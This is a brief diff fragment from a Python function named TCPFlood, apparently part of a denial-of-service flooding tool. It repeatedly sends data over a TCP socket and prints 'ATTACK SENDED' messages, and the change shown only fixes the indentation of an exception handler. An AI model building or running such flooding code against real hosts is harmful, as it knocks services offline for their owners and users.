@@ -29,7 +29,7 @@ def TCPFlood():
              tcp_socket.sendall(avi)
              tcp_socket.sendall(avi)
              print(f"ATTACK SENDED TO {ip}:{port}")
-      except socket.error:
+     except socket.error:
              print(f"ATTACK SENDED TO {ip}:{port}")
              tcp_socket.close()
       
